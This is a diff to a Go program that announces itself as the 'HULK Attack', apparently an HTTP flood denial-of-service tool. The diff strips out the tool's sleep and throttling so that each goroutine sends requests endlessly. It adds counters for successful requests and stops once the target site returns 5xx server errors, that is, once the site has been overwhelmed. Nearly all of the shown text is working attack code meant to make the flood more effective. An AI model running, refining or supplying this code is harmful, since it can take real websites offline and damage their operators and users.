@@ -19,7 +19,6 @@ import (
 	"syscall"
 	"strings"
 	"strconv"
-	"time"
 	"runtime"
 )
 
@@ -28,9 +27,9 @@ const ACCEPT_CHARSET = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
 	STARTED = iota
-	EXIT_OK
+	GOT_OK
 	EXIT_ERR
-	COMPLETE
+	TARGET_OK
 )
 
 // global params
@@ -67,7 +66,7 @@ func main() {
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.Parse()
 	
-	t := os.Getenv("HULKMAXPROC")
+	t := os.Getenv("HULKMAXPROCS")
 	maxproc, e := strconv.Atoi(t)
 	if e != nil {
 		maxproc = 1024
@@ -82,27 +81,27 @@ func main() {
 	go func() {
 		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
 		ss := make(chan int, 64) // start/stop flag
-		cur, err := 0, 0
-		fmt.Println("Cur req |\tErr req |\tSent req |\tGen state |\tGoroutines")
+		cur, err, sent := 0, 0, 0
+		fmt.Println("In use |\tResp OK |\tGot err")
 		for {
-			go httpcall(site, u.Host, ss)
-			if (cur + err) % 20 == 0 {
-				fmt.Printf("\r%7d |\t%7d |\t%8d |\tsending   |\t%7d", cur, err, cur+err, runtime.NumGoroutine())
+			if cur < maxproc {
+				go httpcall(site, u.Host, ss)
+			}
+			if sent % 10 == 0 {
+				fmt.Printf("\r%6d |\t%7d |\t%6d", cur, sent, err)
 			}
 			switch <-ss {
 			case STARTED:
 				cur++
-				if cur > maxproc {
-					fmt.Printf("\r%7d |\t%7d |\t%8d |\tsleeping  |\t%7d", cur, err, cur+err, runtime.NumGoroutine())
-					time.Sleep(12 * time.Second)
-					runtime.GC()
-				}
 			case EXIT_ERR:
 				err++
 				cur--
-			case EXIT_OK:
-				cur--		
-			case COMPLETE:
+				if err % 10 == 0 {
+					runtime.GC()
+				}
+			case GOT_OK:
+				sent++
+			case TARGET_OK:
 				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
@@ -141,19 +140,19 @@ Reuse:
 	q.Header.Set("Host", host)	
 	r, e := client.Do(q)	
 	if e != nil {
+		fmt.Fprintln(os.Stderr, e.Error())
 		s<-EXIT_ERR
 		return
 	}
 	r.Body.Close()
+	s<-GOT_OK
 	if safe {
 		switch r.StatusCode {
 		case 500, 501, 502, 503, 504:
-			s<-COMPLETE
+			s<-TARGET_OK
 		}
-	} else {
-		time.Sleep(144 * time.Millisecond)
-		goto Reuse
 	}
+	goto Reuse
 }
 
 func buildblock(size int)(s string) {
